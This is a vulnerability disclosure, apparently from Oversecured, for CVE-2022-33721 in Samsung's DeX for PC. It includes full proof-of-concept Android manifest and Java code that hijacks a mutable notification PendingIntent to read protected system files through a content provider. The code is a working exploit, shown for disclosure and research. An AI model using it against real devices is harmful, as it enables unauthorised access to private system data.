# Details

<table>
    <tr>
        <td>Name</td>
        <td>DeX for PC</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.sec.android.app.dexonpc</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.03.29</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.08.02</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>High</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-33721">CVE-2022-33721</a> (SVE-2022-0788)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$2160</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/027.%20DeX%20for%20PC%20—%20Gaining%20access%20to%20arbitrary_%20content%20providers%20with%20system%20privilege/Oversecured_report.png)

Oversecured found the use of an implicit intent to create a `PendingIntent` object for notifications without using the `PendingIntent.FLAG_IMMUTABLE` flag. The attacker's app, if it had access to app notifications, could intercept them and redirect them to its activity, before making it grant access permissions to content providers with the `android:grantUriPermissions="true"` flag.

**Proof of Concept**

File `AndroidManifest.xml`:
```xml
<service android:name=".NotificationListener" android:label="PoC" android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" android:exported="true">
    <intent-filter>
        <action android:name="android.service.notification.NotificationListenerService" />
    </intent-filter>
</service>
```
```xml
<activity android:name=".InterceptActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.BROWSABLE" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:scheme="https" android:host="help.content.samsung.com" android:pathPrefix="/csweb/auth/gosupport.do" />
        <category android:name="smth" />
    </intent-filter>
</activity>
```

File `NotificationListener.java`:
```java
private static final String APP = "com.sec.android.app.dexonpc";

@Override
public void onNotificationPosted(StatusBarNotification sbn, NotificationListenerService.RankingMap rankingMap) {
    if (!APP.equals(sbn.getPackageName())) {
        return;
    }
    PendingIntent contentIntent = sbn.getNotification().contentIntent;
    if (contentIntent == null) {
        return;
    }
    try {
        Intent fillin = new Intent();
        fillin.addCategory("smth");
        fillin.setClipData(getClipData());
        fillin.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
                | Intent.FLAG_GRANT_WRITE_URI_PERMISSION
                | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
                | Intent.FLAG_GRANT_PREFIX_URI_PERMISSION);

        contentIntent.send(this, 0, fillin);
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private ClipData getClipData() {
    Uri uri = Uri.parse("content://com.sec.internal.ims.rcs.fileprovider/root/data/system/users/0/settings_secure.xml");
    return ClipData.newRawUri("", uri);
}
```

File `InterceptActivity.java`:
```java
Uri uri = getIntent().getClipData().getItemAt(0).getUri();
try (InputStream inputStream = getContentResolver().openInputStream(uri)) {
    Log.d("evil", IOUtils.toString(inputStream));
} catch (Throwable th) {
    throw new RuntimeException(th);
}
```

As a result, when the app displays this notification, the attacking app automatically forwards the `PendingIntent` object to `InterceptActivity`.

## References

- [Oversecured Blog. Gaining access to arbitrary* Content Providers](https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/)
